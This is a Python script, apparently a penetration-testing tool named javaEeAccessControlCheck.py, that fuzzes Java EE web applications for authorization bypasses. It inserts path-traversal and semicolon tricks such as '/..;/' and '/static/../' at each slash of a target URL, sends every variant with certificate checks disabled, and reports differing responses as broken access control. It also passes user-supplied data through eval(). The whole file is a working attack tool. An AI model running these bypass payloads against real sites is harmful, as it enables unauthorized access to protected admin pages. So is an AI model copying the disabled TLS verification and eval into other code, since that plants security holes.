# Author: kw0ng
# blog: https://kw0ng.top
import sys
import re
import requests
import json
import ssl
import urllib.request

requests.packages.urllib3.disable_warnings()
ssl._create_default_https_context = ssl._create_unverified_context
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


class NoRedirHandler(urllib.request.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        return fp

    http_error_301 = http_error_302


class AccessControl:
    def __init__(self, url, method=None, data=None):
        self.url = url
        self.uri = self.AnalysisUri()
        self.host = self.AnalysisHost()
        self.method = method
        self.data = data
        # self.proxies = {
        #     "http": "http://127.0.0.1:8080",
        #     "https": "http://127.0.0.1:8080"
        # }
        self.proxies = {}
        self.whiteList = [
            "/", "/;/", ";/", "/;/../", "/java.css/../", "/java.js/../", "/java.jpg/../",
            "/java.ico/../", "/java.png/../", "/java.gif/../",
            "/java.css/..;/", "/java.js/..;/", "/java.jpg/..;/",
            "/java.ico/..;/", "/java.png/..;/", "/java.gif/..;/",
            "/login.html/../", "/login.html/..;/", "/res/../", "/res/..;/",
            "/static/../", "/static/..;/", "/css/../", "/css/..;/",
            "/images/../", "/images/..;/", "/themes/../", "/themes/..;/",
            "/userfiles/../", "/userfiles/..;/", "/js/../", "/js/..;/",
            "/rest/../", "/rest/..;/", "/api/../", "/api/..;/"
        ]

    def AnalysisUri(self):
        return re.search('[http,https]://.*?(/.*?)$', self.url).group(1)

    def AnalysisHost(self):
        return re.search('(.*?://.*?)/.*?$', self.url).group(1)

    def findSlash(self, uri):
        slashList = []
        uri = uri if uri[-1] != "/" else uri[:-1]
        for i in range(len(uri.split("?")[0])):
            if uri[i] == '/':
                slashList.append(i)
        return slashList

    def GeneratePayload(self, uri):
        resultList = []
        Slash = self.findSlash(uri)
        for i in self.whiteList:
            for index in Slash:
                if index == 0 and i == ";/":
                    continue
                uriPayload = uri[:index] + i + uri[index + 1:]
                resultList.append(uriPayload)
                if "?" in uri and uri.split("?")[0][-1] != "/":
                    uriPayload = uriPayload.split("?")
                    resultList.append(uriPayload[0] + "/?"+uriPayload[1])
                elif "?" not in uri and uri.split("?")[0][-1] != "/":
                    resultList.append(uriPayload + "/")
        return set(resultList)

    def testTargetAsUrllibGet(self, url):
        proxySupport = urllib.request.ProxyHandler(self.proxies)
        opener = urllib.request.build_opener(NoRedirHandler, proxySupport)
        urllib.request.install_opener(opener)
        response = urllib.request.urlopen(url).read()
        return response.decode("utf8")
        # return response.decode("unicode-escape")

    def testTargetAsUrllibPost(self, url):
        proxySupport = urllib.request.ProxyHandler(self.proxies)
        opener = urllib.request.build_opener(NoRedirHandler, proxySupport)
        urllib.request.install_opener(opener)
        if self.method == '-data':
            data = bytes(self.data, encoding='utf8')
            request = urllib.request.Request(url, data=data)
        else:
            headers = {"Content-Type": "application/json;charset=UTF-8"}
            data = json.dumps(eval(self.data))
            data = bytes(str(data), encoding='utf8')
            request = urllib.request.Request(url, headers=headers, data=data)
        response = urllib.request.urlopen(request).read()
        return response.decode("utf8")
        # return response.decode("unicode-escape")

    def testTargetAsGet(self, urlList):
        try:
            responseList = []
            responseDict = {}
            for url in urlList:
                try:
                    print(url)
                    if '../' in url:
                        res = self.testTargetAsUrllibGet(url)
                    else:
                        res = requests.get(url,
                                           timeout=10,
                                           verify=False,
                                           allow_redirects=False,
                                           proxies=self.proxies)
                        try:
                            res = res.content.decode()
                        except:
                            res = res.text
                except:
                    continue
                if res not in responseList:
                    responseList.append(res)
                    responseDict[url] = res[:512]
            return responseDict
        except Exception as e:
            print(e)

    def testTargetAsPost(self, urlList):
        responseList = []
        responseDict = {}
        for url in urlList:
            try:
                if '../' in url:
                    res = self.testTargetAsUrllibPost(url)
                else:
                    if self.method == '-data':
                        res = requests.post(url,
                                            data=self.data,
                                            timeout=10,
                                            verify=False,
                                            allow_redirects=False,
                                            proxies=self.proxies)
                        try:
                            res = res.content.decode()
                        except:
                            res = res.text
                    elif self.method == '-data-json':
                        headers = {
                            "Content-Type": "application/json;charset=UTF-8"
                        }
                        res = requests.post(url,
                                            data=json.dumps(eval(self.data)),
                                            timeout=10,
                                            verify=False,
                                            headers=headers,
                                            allow_redirects=False,
                                            proxies=self.proxies)
                        try:
                            res = res.content.decode()
                        except:
                            res = res.text
            except:
                continue
            if res not in responseList:
                responseList.append(res)
                responseDict[url] = res[:512]
        return responseDict

    def run(self):
        payloadList = self.GeneratePayload(self.uri)
        urlList = [self.host + i for i in payloadList]
        if self.method == None:
            resultDict = self.testTargetAsGet(urlList)
        else:
            resultDict = self.testTargetAsPost(urlList)
        if resultDict and len(resultDict) > 1:
            print("\033[1;31m+++++broken access control+++++\033[0m")
            for key in resultDict:
                print("\033[1;31m%s \033[0m" % key)
                print(resultDict[key])
        else:
            print("\033[1;31mNo abnormality \033[0m")

    def allLengthAsGet(self):
        try:
            payloadList = self.GeneratePayload(self.uri)
            urlList = [self.host + i for i in payloadList]
            resultList = []
            for url in urlList:
                try:
                    if '../' in url:
                        res = self.testTargetAsUrllibGet(url)
                    else:
                        res = requests.get(url,
                                           timeout=10,
                                           verify=False,
                                           allow_redirects=False,
                                           proxies=self.proxies)
                        try:
                            res = res.content.decode()
                        except:
                            res = res.text
                    resultList.append([len(res), url])
                    print("\033[1;31mResponse Length: %s \033[0m" % len(res),
                          url.split("?")[0],
                          end="\r")
                except Exception as e:
                    print(e)
                    continue
            print("*" * 60 + "Done" + "*" * 60)
            resultList.sort()
            for result in resultList:
                print("\033[1;31mResponse Length: %s \033[0m" % result[0],
                      result[1])
        except Exception as e:
            print(e)

    def allLengthAsPost(self):
        try:
            payloadList = self.GeneratePayload(self.uri)
            urlList = [self.host + i for i in payloadList]
            resultList = []
            for url in urlList:
                try:
                    if '../' in url:
                        res = self.testTargetAsUrllibPost(url)
                    else:
                        if self.method == '-data':
                            res = requests.post(url,
                                                data=self.data,
                                                timeout=10,
                                                verify=False,
                                                allow_redirects=False,
                                                proxies=self.proxies)
                            try:
                                res = res.content.decode()
                            except:
                                res = res.text
                        elif self.method == '-data-json':
                            headers = {
                                "Content-Type": "application/json;charset=UTF-8"
                            }
                            res = requests.post(url,
                                                data=json.dumps(
                                                    eval(self.data)),
                                                timeout=10,
                                                verify=False,
                                                headers=headers,
                                                allow_redirects=False,
                                                proxies=self.proxies)
                            try:
                                res = res.content.decode()
                            except:
                                res = res.text
                    resultList.append([len(res), url])
                    print("\033[1;31mResponse Length: %s \033[0m" % len(res),
                          url.split("?")[0],
                          end='\r')
                except:
                    continue
            print("*" * 60 + "Done" + "*" * 60)
            resultList.sort()
            for result in resultList:
                print("\033[1;31mResponse Length: %s \033[0m" % result[0],
                      result[1])
        except Exception as e:
            print(e)


if __name__ == "__main__":
    # get
    if len(sys.argv[1:]) == 1:
        ac = AccessControl(sys.argv[1])
        ac.run()
    # get all length
    elif len(sys.argv[1:]) == 2:
        ac = AccessControl(sys.argv[1])
        ac.allLengthAsGet()
    # post
    elif len(sys.argv[1:]) == 3:
        url = sys.argv[1]
        method = sys.argv[2]
        data = sys.argv[3]
        ac = AccessControl(url, method, data)
        ac.run()
    elif len(sys.argv[1:]) == 4:
        url = sys.argv[1]
        method = sys.argv[2]
        data = sys.argv[3]
        ac = AccessControl(url, method, data)
        ac.allLengthAsPost()
    elif len(sys.argv[1:]) < 1:
        print(
            'python3 javaEeAccessControlCheck.py "http://127.0.0.1/admin/index?id=1"'
        )
        print(
            'python3 javaEeAccessControlCheck.py "http://127.0.0.1/admin/index" -data id=1'
        )
        print(
            '''python3 javaEeAccessControlCheck.py "http://127.0.0.1/admin/index" -data-json '{"id":1}' '''
        )
        print(
            'python3 javaEeAccessControlCheck.py "http://127.0.0.1/admin/index?id=1" -all'
        )
        print(
            '''python3 javaEeAccessControlCheck.py "http://127.0.0.1/admin/index" -data-json '{"id":1}' -all'''
        )
